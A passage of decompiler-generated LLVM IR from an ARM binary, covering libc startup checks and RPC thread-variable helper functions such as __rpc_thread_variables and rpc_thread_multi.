  %v8_2b2e4 = icmp eq i32 %tmp53, -1
  store i1 %v8_2b2e4, i1* %cpsr_z.global-to-local, align 1
  %v2_2b2e8 = inttoptr i32 %v4_2b2d4 to i32*
  store i32 %v0_2b2e8, i32* %v2_2b2e8, align 4
  br i1 %v3_2b2e4, label %dec_label_pc_2b2f0, label %dec_label_pc_2b318

dec_label_pc_2b2f0:                               ; preds = %bb63
  %v0_2b2f0 = call i32 @getuid()
  store i32 %v0_2b2f0, i32* @r0, align 4
  store i32 %v0_2b2f0, i32* @r4, align 4
  %v0_2b2f8 = call i32 @geteuid()
  store i32 %v0_2b2f8, i32* @r0, align 4
  %v0_2b2fc = load i32, i32* @r4, align 4
  %v9_2b2fc = icmp eq i32 %v0_2b2fc, %v0_2b2f8
  store i1 %v9_2b2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2b2fc, label %dec_label_pc_2b304, label %dec_label_pc_2b340

dec_label_pc_2b304:                               ; preds = %dec_label_pc_2b2f0
  %v1_2b304 = call i32 @getgid(i32 %v0_2b2f8)
  store i32 %v1_2b304, i32* @r0, align 4
  store i32 %v1_2b304, i32* @r4, align 4
  %v0_2b30c = call i32 @getegid()
  store i32 %v0_2b30c, i32* @r0, align 4
  %v0_2b310 = load i32, i32* @r4, align 4
  %v9_2b310 = icmp eq i32 %v0_2b310, %v0_2b30c
  store i1 %v9_2b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2b310, label %dec_label_pc_2b318, label %dec_label_pc_2b340

dec_label_pc_2b318:                               ; preds = %dec_label_pc_2b304, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_2b2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_2b2e4, label %dec_label_pc_2b364, label %dec_label_pc_2b324

dec_label_pc_2b324:                               ; preds = %dec_label_pc_2b318
  store i32 %tmp52, i32* @r3, align 4
  %v9_2b328 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_2b328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2b328, label %dec_label_pc_2b330, label %dec_label_pc_2b340

dec_label_pc_2b330:                               ; preds = %dec_label_pc_2b324
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_2b338 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_2b338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2b338, label %dec_label_pc_2b364, label %dec_label_pc_2b340

dec_label_pc_2b340:                               ; preds = %dec_label_pc_2b324, %dec_label_pc_2b304, %dec_label_pc_2b2f0, %dec_label_pc_2b330
  %v2_2b348 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_2b354 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_2b360 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_2b360, i32* @r0, align 4
  br label %dec_label_pc_2b364

dec_label_pc_2b364:                               ; preds = %dec_label_pc_2b330, %dec_label_pc_2b318, %dec_label_pc_2b340
  %v0_2b364 = load i32, i32* @r7, align 4
  %v1_2b364 = inttoptr i32 %v0_2b364 to i32*
  %v2_2b364 = load i32, i32* %v1_2b364, align 4
  store i32 %v2_2b364, i32* %r2.global-to-local, align 4
  store i32 20812, i32* %r3.global-to-local, align 4
  %v1_2b36c = load i32, i32* @r6, align 4
  %v3_2b36c = add i32 %v1_2b36c, 20812
  %v4_2b36c = inttoptr i32 %v3_2b36c to i32*
  store i32 %v2_2b364, i32* %v4_2b36c, align 4
  %v0_2b370 = load i32, i32* @r7, align 4
  %v1_2b370 = inttoptr i32 %v0_2b370 to i32*
  %v2_2b370 = load i32, i32* %v1_2b370, align 4
  store i32 %v2_2b370, i32* @r4, align 4
  %v2_2b374 = icmp eq i32 %v2_2b370, 0
  store i1 %v2_2b374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b374, label %bb65, label %dec_label_pc_2b37c

dec_label_pc_2b37c:                               ; preds = %dec_label_pc_2b364
  store i32 264, i32* %r3.global-to-local, align 4
  %v0_2b380 = load i32, i32* @r6, align 4
  %v2_2b380 = add i32 %v0_2b380, 264
  %v3_2b380 = inttoptr i32 %v2_2b380 to i32*
  %v4_2b380 = load i32, i32* %v3_2b380, align 4
  store i32 %v4_2b380, i32* %r3.global-to-local, align 4
  %v2_2b384 = inttoptr i32 %v4_2b380 to i32*
  store i32 %v2_2b370, i32* %v2_2b384, align 4
  %v0_2b38c = load i32, i32* @r7, align 4
  %v1_2b38c = inttoptr i32 %v0_2b38c to i32*
  %v2_2b38c = load i32, i32* %v1_2b38c, align 4
  %v4_2b390 = call i32 @__GI_strrchr(i32 %v2_2b38c, i32 47, i32 %v2_2b364, i32 %v4_2b380)
  store i32 %v4_2b390, i32* @r0, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v2_2b398 = icmp eq i32 %v4_2b390, 0
  store i1 %v2_2b398, i1* %cpsr_z.global-to-local, align 1
  %v0_2b39c = load i32, i32* @r6, align 4
  %v2_2b39c = add i32 %v0_2b39c, 144
  %v3_2b39c = inttoptr i32 %v2_2b39c to i32*
  %v4_2b39c = load i32, i32* %v3_2b39c, align 4
  store i32 %v4_2b39c, i32* %r2.global-to-local, align 4
  br i1 %v2_2b398, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_2b37c
  %v2_2b3a448 = inttoptr i32 %v4_2b39c to i32*
  store i32 0, i32* %v2_2b3a448, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_2b37c
  %v2_2b3a0 = add i32 %v4_2b390, 1
  store i32 %v2_2b3a0, i32* %r3.global-to-local, align 4
  %v2_2b3a4 = inttoptr i32 %v4_2b39c to i32*
  store i32 %v4_2b390, i32* %v2_2b3a4, align 4
  %v1_2b3a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_2b3a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_2b3a8 = inttoptr i32 %v2_2b3a8 to i32*
  store i32 %v1_2b3a8, i32* %v3_2b3a8, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_2b364
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_2b3c0 = load i32, i32* @r6, align 4
  %v2_2b3c0 = add i32 %v0_2b3c0, -160
  store i32 %v2_2b3c0, i32* %r8.global-to-local, align 4
  store i32 55700, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_2b3d0 = add i32 %v0_2b3c0, 55700
  %v4_2b3d0 = inttoptr i32 %v3_2b3d0 to i32*
  store i32 %arg5, i32* %v4_2b3d0, align 4
  %v0_2b3e817 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b3e818 = load i32, i32* %r5.global-to-local, align 4
  %v3_2b3e820 = icmp ult i32 %v0_2b3e817, %v1_2b3e818
  %v9_2b3e826 = icmp eq i32 %v0_2b3e817, %v1_2b3e818
  store i1 %v9_2b3e826, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2b3e820, label %dec_label_pc_2b3d8, label %dec_label_pc_2b418.lr.ph

dec_label_pc_2b3d8:                               ; preds = %dec_label_pc_2b3d8, %bb65
  %v1_2b3d8 = phi i32 [ %v1_2b3e4, %dec_label_pc_2b3d8 ], [ %v0_2b3e817, %bb65 ]
  %v0_2b3d8 = load i32, i32* %r8.global-to-local, align 4
  %v4_2b3d8 = mul i32 %v1_2b3d8, 4
  %v5_2b3d8 = add i32 %v4_2b3d8, %v0_2b3d8
  %v6_2b3d8 = inttoptr i32 %v5_2b3d8 to i32*
  %v7_2b3d8 = load i32, i32* %v6_2b3d8, align 4
  store i32 %v7_2b3d8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_2b3d8)
  %v0_2b3e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b3e4 = add i32 %v0_2b3e4, 1
  store i32 %v1_2b3e4, i32* %r4.global-to-local, align 4
  %v1_2b3e8 = load i32, i32* %r5.global-to-local, align 4
  %v3_2b3e8 = icmp ult i32 %v1_2b3e4, %v1_2b3e8
  %v9_2b3e8 = icmp eq i32 %v1_2b3e4, %v1_2b3e8
  store i1 %v9_2b3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2b3e8, label %dec_label_pc_2b3d8, label %dec_label_pc_2b418.lr.ph

dec_label_pc_2b418.lr.ph:                         ; preds = %dec_label_pc_2b3d8, %bb65
  %v2_2b3f0 = icmp eq i32 %v0_2b24c, 0
  store i1 %v2_2b3f0, i1* %cpsr_z.global-to-local, align 1
  %v2_2b3f8 = xor i1 %v2_2b3f0, true
  call void @__pseudo_cond_branch(i1 %v2_2b3f8, i32 %v0_2b24c)
  store i32 -160, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  %v0_2b40c = load i32, i32* @r6, align 4
  %v2_2b40c = add i32 %v0_2b40c, -160
  store i32 %v2_2b40c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2b418

dec_label_pc_2b418:                               ; preds = %dec_label_pc_2b418.dec_label_pc_2b418_crit_edge, %dec_label_pc_2b418.lr.ph
  %v1_2b418 = phi i32 [ %v1_2b424, %dec_label_pc_2b418.dec_label_pc_2b418_crit_edge ], [ 0, %dec_label_pc_2b418.lr.ph ]
  %v0_2b418 = phi i32 [ %v0_2b418.pre, %dec_label_pc_2b418.dec_label_pc_2b418_crit_edge ], [ %v2_2b40c, %dec_label_pc_2b418.lr.ph ]
  %v4_2b418 = mul i32 %v1_2b418, 4
  %v5_2b418 = add i32 %v4_2b418, %v0_2b418
  %v6_2b418 = inttoptr i32 %v5_2b418 to i32*
  %v7_2b418 = load i32, i32* %v6_2b418, align 4
  store i32 %v7_2b418, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_2b418)
  %v0_2b424 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b424 = add i32 %v0_2b424, 1
  store i32 %v1_2b424, i32* %r4.global-to-local, align 4
  %v1_2b428 = load i32, i32* %r5.global-to-local, align 4
  %v3_2b428 = icmp ult i32 %v1_2b424, %v1_2b428
  %v9_2b428 = icmp eq i32 %v1_2b424, %v1_2b428
  store i1 %v9_2b428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2b428, label %dec_label_pc_2b418.dec_label_pc_2b418_crit_edge, label %dec_label_pc_2b430

dec_label_pc_2b418.dec_label_pc_2b418_crit_edge:  ; preds = %dec_label_pc_2b418
  %v0_2b418.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2b418

dec_label_pc_2b430:                               ; preds = %dec_label_pc_2b418
  %v0_2b434.pre = load i32, i32* @r6, align 4
  store i32 236, i32* %r3.global-to-local, align 4
  %v2_2b434 = add i32 %v0_2b434.pre, 236
  %v3_2b434 = inttoptr i32 %v2_2b434 to i32*
  %v4_2b434 = load i32, i32* %v3_2b434, align 4
  store i32 %v4_2b434, i32* %r2.global-to-local, align 4
  store i32 %v4_2b434, i32* %r3.global-to-local, align 4
  %v2_2b43c = icmp eq i32 %v4_2b434, 0
  store i1 %v2_2b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b43c, label %dec_label_pc_2b454, label %dec_label_pc_2b444

dec_label_pc_2b444:                               ; preds = %dec_label_pc_2b430
  call void @__pseudo_branch(i32 %v4_2b434)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2b450 = load i32, i32* @r0, align 4
  %v2_2b450 = inttoptr i32 %v1_2b450 to i32*
  store i32 0, i32* %v2_2b450, align 4
  %v0_2b458.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2b454

dec_label_pc_2b454:                               ; preds = %dec_label_pc_2b430, %dec_label_pc_2b444
  %v0_2b458 = phi i32 [ %v0_2b434.pre, %dec_label_pc_2b430 ], [ %v0_2b458.pre, %dec_label_pc_2b444 ]
  store i32 188, i32* %r3.global-to-local, align 4
  %v2_2b458 = add i32 %v0_2b458, 188
  %v3_2b458 = inttoptr i32 %v2_2b458 to i32*
  %v4_2b458 = load i32, i32* %v3_2b458, align 4
  store i32 %v4_2b458, i32* %r2.global-to-local, align 4
  store i32 %v4_2b458, i32* %r3.global-to-local, align 4
  %v2_2b460 = icmp eq i32 %v4_2b458, 0
  store i1 %v2_2b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b460, label %dec_label_pc_2b478, label %dec_label_pc_2b468

dec_label_pc_2b468:                               ; preds = %dec_label_pc_2b454
  call void @__pseudo_branch(i32 %v4_2b458)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2b474 = load i32, i32* @r0, align 4
  %v2_2b474 = inttoptr i32 %v1_2b474 to i32*
  store i32 0, i32* %v2_2b474, align 4
  %v0_2b47c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2b478

dec_label_pc_2b478:                               ; preds = %dec_label_pc_2b454, %dec_label_pc_2b468
  %v0_2b47c = phi i32 [ %v0_2b458, %dec_label_pc_2b454 ], [ %v0_2b47c.pre, %dec_label_pc_2b468 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_2b47c = add i32 %v0_2b47c, 80
  %v3_2b47c = inttoptr i32 %v2_2b47c to i32*
  %v4_2b47c = load i32, i32* %v3_2b47c, align 4
  store i32 %v4_2b47c, i32* %r3.global-to-local, align 4
  %v1_2b484 = inttoptr i32 %v4_2b47c to i32*
  %v2_2b484 = load i32, i32* %v1_2b484, align 4
  store i32 %v2_2b484, i32* %r2.global-to-local, align 4
  %v0_2b488 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_2b494 = call i32 @__GI_exit(i32 %v0_2b488)
  %v0_2b498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2b498, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_2b478
  %v1_2b498 = load i32, i32* @r1, align 4
  %v3_2b498 = load i32, i32* @r7, align 4
  %v4_2b498 = lshr i32 %v1_2b494, %v3_2b498
  %v5_2b498 = sub i32 32, %v3_2b498
  %v6_2b498 = shl i32 %v1_2b494, %v5_2b498
  %v7_2b498 = or i32 %v6_2b498, %v4_2b498
  %v9_2b498 = and i32 %v7_2b498, %v1_2b498
  store i32 %v9_2b498, i32* %sb.global-to-local, align 4
  %v2_2b49c = load i32, i32* %r8.global-to-local, align 4
  %v3_2b4a4 = mul i32 %v9_2b498, %v2_2b49c
  %v2_2b4a8 = inttoptr i32 %v3_2b4a4 to i64*
  %v3_2b4a8 = load i64, i64* %v2_2b4a8, align 4
  %v4_2b4a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_2b4a8 = udiv i64 %v3_2b4a8, 4294967296
  %v7_2b4a8 = trunc i64 %v6_2b4a8 to i32
  %v9_2b4a8 = sub i32 %v7_2b4a8, %v4_2b4a8
  %v2_2b4ac = load i32, i32* %r2.global-to-local, align 4
  %v3_2b4ac = and i32 %v2_2b4ac, %v9_2b4a8
  store i32 %v3_2b4ac, i32* %r8.global-to-local, align 4
  %v5_2b4b0 = sdiv i32 %v4_2b4a8, 4
  %v6_2b4b0 = and i32 %v9_2b4a8, %v5_2b4b0
  store i32 %v6_2b4b0, i32* %r5.global-to-local, align 4
  %v5_2b4b4 = mul i32 %v3_2b4ac, 4
  %v6_2b4b4 = and i32 %v5_2b4b4, %v9_2b4a8
  %v3_2b4b8 = mul i32 %v6_2b4b4, %v6_2b4b4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2b478, %bb66
  %v4_2b4b8 = phi i32 [ %v1_2b494, %dec_label_pc_2b478 ], [ %v3_2b4b8, %bb66 ]
  ret i32 %v4_2b4b8

; uselistorder directives
  uselistorder i32 %v1_2b494, { 0, 2, 1 }
  uselistorder i32 %v0_2b434.pre, { 1, 0 }
  uselistorder i32 %v1_2b428, { 1, 0 }
  uselistorder i32 %v1_2b424, { 3, 2, 1, 0 }
  uselistorder i32 %v1_2b3e8, { 1, 0 }
  uselistorder i32 %v1_2b3e4, { 1, 2, 3, 0 }
  uselistorder i32 %v4_2b39c, { 1, 0, 2 }
  uselistorder i1 %v8_2b2e4, { 1, 2, 0 }
  uselistorder i32 %v2_2b2b4, { 1, 2, 0 }
  uselistorder i1 %v2_2b29c, { 1, 0 }
  uselistorder i32 %v4_2b280, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_2b24c, { 1, 0 }
  uselistorder i32 %v3_2b21c, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 5, 4, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 0, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 -160, { 1, 3, 2, 0 }
  uselistorder i32 47, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 11, 10, 2, 3, 5, 4, 6, 7, 8, 1, 9 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_2b478, { 1, 0 }
  uselistorder label %dec_label_pc_2b454, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2b364, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b340, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_2b2b4, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_2b29c, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_2b4dc = load i32, i32* @lr, align 4
  store i32 %v0_2b4dc, i32* %stack_var_-4, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r1, align 4
  %v4_2b4e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 160) to i32*), align 4
  %v2_2b4ec = icmp eq i32 %v4_2b4e8, 0
  store i32 55712, i32* %r0.global-to-local, align 4
  br i1 %v2_2b4ec, label %dec_label_pc_2b510, label %dec_label_pc_2b4fc

dec_label_pc_2b4fc:                               ; preds = %entry
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712), i32* @r1, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2b4e8)
  br label %dec_label_pc_2b520

dec_label_pc_2b510:                               ; preds = %entry
  %v4_2b514 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 88) to i32*), align 4
  store i32 %v4_2b514, i32* @r2, align 4
  %v2_2b51c = inttoptr i32 %v4_2b514 to i32*
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712), i32* %v2_2b51c, align 4
  br label %dec_label_pc_2b520

dec_label_pc_2b520:                               ; preds = %dec_label_pc_2b4fc, %dec_label_pc_2b510
  %v2_2b524 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_2b524, i32* @lr, align 4
  %v1_2b528 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2b528

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2b520, { 1, 0 }
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2b53c = load i32, i32* @r4, align 4
  store i32 %v3_2b53c, i32* %stack_var_-12, align 4
  %v6_2b53c = load i32, i32* @r5, align 4
  %v9_2b53c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_2b54c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 136) to i32*), align 4
  %v2_2b550 = icmp eq i32 %v4_2b54c, 0
  br i1 %v2_2b550, label %dec_label_pc_2b56c, label %dec_label_pc_2b55c

dec_label_pc_2b55c:                               ; preds = %entry
  store i32 177512, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2b54c)
  br label %dec_label_pc_2b578

dec_label_pc_2b56c:                               ; preds = %entry
  %v4_2b570 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 88) to i32*), align 4
  %v1_2b574 = inttoptr i32 %v4_2b570 to i32*
  %v2_2b574 = load i32, i32* %v1_2b574, align 4
  br label %dec_label_pc_2b578

dec_label_pc_2b578:                               ; preds = %dec_label_pc_2b55c, %dec_label_pc_2b56c
  %v0_2b578 = phi i32 [ 2, %dec_label_pc_2b55c ], [ %v2_2b574, %dec_label_pc_2b56c ]
  %v2_2b578 = icmp eq i32 %v0_2b578, 0
  br i1 %v2_2b578, label %dec_label_pc_2b580, label %dec_label_pc_2b670

dec_label_pc_2b580:                               ; preds = %dec_label_pc_2b578
  %v0_2b584 = load i32, i32* @r5, align 4
  %v2_2b584 = add i32 %v0_2b584, 32
  %v3_2b584 = inttoptr i32 %v2_2b584 to i32*
  %v4_2b584 = load i32, i32* %v3_2b584, align 4
  %v2_2b588 = icmp eq i32 %v4_2b584, 0
  store i32 55708, i32* @r4, align 4
  br i1 %v2_2b588, label %dec_label_pc_2b5ac, label %dec_label_pc_2b594

dec_label_pc_2b594:                               ; preds = %dec_label_pc_2b580
  %v2_2b59c = add i32 %v0_2b584, -103608
  store i32 %v2_2b59c, i32* @r1, align 4
  store i32 177576, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2b584)
  br label %dec_label_pc_2b5c4

dec_label_pc_2b5ac:                               ; preds = %dec_label_pc_2b580
  %v2_2b5ac = add i32 %v0_2b584, 55708
  %v3_2b5ac = inttoptr i32 %v2_2b5ac to i32*
  %v4_2b5ac = load i32, i32* %v3_2b5ac, align 4
  %v2_2b5b0 = icmp eq i32 %v4_2b5ac, 0
  br i1 %v2_2b5b0, label %dec_label_pc_2b5b8, label %dec_label_pc_2b5c4

dec_label_pc_2b5b8:                               ; preds = %dec_label_pc_2b5ac
  %v0_2b5b8 = call i32 @rpc_thread_multi()
  %v1_2b5c0 = load i32, i32* @r5, align 4
  %v2_2b5c0 = load i32, i32* @r4, align 4
  %v3_2b5c0 = add i32 %v2_2b5c0, %v1_2b5c0
  %v4_2b5c0 = inttoptr i32 %v3_2b5c0 to i32*
  store i32 1, i32* %v4_2b5c0, align 4
  br label %dec_label_pc_2b5c4

dec_label_pc_2b5c4:                               ; preds = %dec_label_pc_2b5ac, %dec_label_pc_2b594, %dec_label_pc_2b5b8
  %v0_2b5c8 = load i32, i32* @r5, align 4
  %v2_2b5c8 = add i32 %v0_2b5c8, 136
  %v3_2b5c8 = inttoptr i32 %v2_2b5c8 to i32*
  %v4_2b5c8 = load i32, i32* %v3_2b5c8, align 4
  %v2_2b5cc = icmp eq i32 %v4_2b5c8, 0
  br i1 %v2_2b5cc, label %dec_label_pc_2b5e4, label %dec_label_pc_2b5d4

dec_label_pc_2b5d4:                               ; preds = %dec_label_pc_2b5c4
  store i32 177632, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2b5c8)
  br label %dec_label_pc_2b5f0

dec_label_pc_2b5e4:                               ; preds = %dec_label_pc_2b5c4
  %v2_2b5e8 = add i32 %v0_2b5c8, 88
  %v3_2b5e8 = inttoptr i32 %v2_2b5e8 to i32*
  %v4_2b5e8 = load i32, i32* %v3_2b5e8, align 4
  %v1_2b5ec = inttoptr i32 %v4_2b5e8 to i32*
  %v2_2b5ec = load i32, i32* %v1_2b5ec, align 4
  br label %dec_label_pc_2b5f0

dec_label_pc_2b5f0:                               ; preds = %dec_label_pc_2b5d4, %dec_label_pc_2b5e4
  %v0_2b5f0 = phi i32 [ 2, %dec_label_pc_2b5d4 ], [ %v2_2b5ec, %dec_label_pc_2b5e4 ]
  %v2_2b5f0 = icmp eq i32 %v0_2b5f0, 0
  br i1 %v2_2b5f0, label %dec_label_pc_2b5f8, label %dec_label_pc_2b670

dec_label_pc_2b5f8:                               ; preds = %dec_label_pc_2b5f0
  %v2_2b600 = call i32 @calloc(i32 1, i32 200)
  %v2_2b604 = icmp eq i32 %v2_2b600, 0
  br i1 %v2_2b604, label %dec_label_pc_2b644, label %dec_label_pc_2b60c

dec_label_pc_2b60c:                               ; preds = %dec_label_pc_2b5f8
  %v0_2b610 = load i32, i32* @r5, align 4
  %v2_2b610 = add i32 %v0_2b610, 160
  %v3_2b610 = inttoptr i32 %v2_2b610 to i32*
  %v4_2b610 = load i32, i32* %v3_2b610, align 4
  %v2_2b614 = icmp eq i32 %v4_2b610, 0
  store i32 %v2_2b600, i32* %r4.global-to-local, align 4
  br i1 %v2_2b614, label %dec_label_pc_2b634, label %dec_label_pc_2b620

dec_label_pc_2b620:                               ; preds = %dec_label_pc_2b60c
  store i32 %v2_2b600, i32* @r1, align 4
  call void @__pseudo_branch(i32 %v4_2b610)
  br label %dec_label_pc_2b674

dec_label_pc_2b634:                               ; preds = %dec_label_pc_2b60c
  %v2_2b638 = add i32 %v0_2b610, 88
  %v3_2b638 = inttoptr i32 %v2_2b638 to i32*
  %v4_2b638 = load i32, i32* %v3_2b638, align 4
  %v2_2b63c = inttoptr i32 %v4_2b638 to i32*
  store i32 %v2_2b600, i32* %v2_2b63c, align 4
  br label %dec_label_pc_2b674

dec_label_pc_2b644:                               ; preds = %dec_label_pc_2b5f8
  %v0_2b648 = load i32, i32* @r5, align 4
  %v2_2b648 = add i32 %v0_2b648, 136
  %v3_2b648 = inttoptr i32 %v2_2b648 to i32*
  %v4_2b648 = load i32, i32* %v3_2b648, align 4
  %v2_2b64c = icmp eq i32 %v4_2b648, 0
  br i1 %v2_2b64c, label %dec_label_pc_2b664, label %dec_label_pc_2b654

dec_label_pc_2b654:                               ; preds = %dec_label_pc_2b644
  call void @__pseudo_branch(i32 %v4_2b648)
  br label %dec_label_pc_2b670

dec_label_pc_2b664:                               ; preds = %dec_label_pc_2b644
  %v2_2b668 = add i32 %v0_2b648, 88
  %v3_2b668 = inttoptr i32 %v2_2b668 to i32*
  %v4_2b668 = load i32, i32* %v3_2b668, align 4
  %v1_2b66c = inttoptr i32 %v4_2b668 to i32*
  %v2_2b66c = load i32, i32* %v1_2b66c, align 4
  br label %dec_label_pc_2b670

dec_label_pc_2b670:                               ; preds = %dec_label_pc_2b5f0, %dec_label_pc_2b578, %dec_label_pc_2b654, %dec_label_pc_2b664
  %v0_2b670 = phi i32 [ %v0_2b5f0, %dec_label_pc_2b5f0 ], [ %v0_2b578, %dec_label_pc_2b578 ], [ 2, %dec_label_pc_2b654 ], [ %v2_2b66c, %dec_label_pc_2b664 ]
  store i32 %v0_2b670, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2b674

dec_label_pc_2b674:                               ; preds = %dec_label_pc_2b634, %dec_label_pc_2b620, %dec_label_pc_2b670
  %v0_2b674 = load i32, i32* %r4.global-to-local, align 4
  %v2_2b67c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2b67c, i32* @r4, align 4
  store i32 %v6_2b53c, i32* @r5, align 4
  store i32 %v9_2b53c, i32* @lr, align 4
  ret i32 %v0_2b674

; uselistorder directives
  uselistorder i32 %v2_2b600, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32 200, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_2b674, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b670, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_2b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_2b5c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b578, { 1, 0 }
}

define i32 @function_2b688(i32 %arg1) local_unnamed_addr {
dec_label_pc_2b688:
  %v0_2b688 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2b688, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2b688
  %v1_2b694 = load i32, i32* @ip, align 4
  %v2_2b694 = load i32, i32* @sb, align 4
  %v3_2b694 = mul i32 %v2_2b694, %v1_2b694
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2b688, %bb
  %v4_2b694 = phi i32 [ %arg1, %dec_label_pc_2b688 ], [ %v3_2b694, %bb ]
  ret i32 %v4_2b694

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
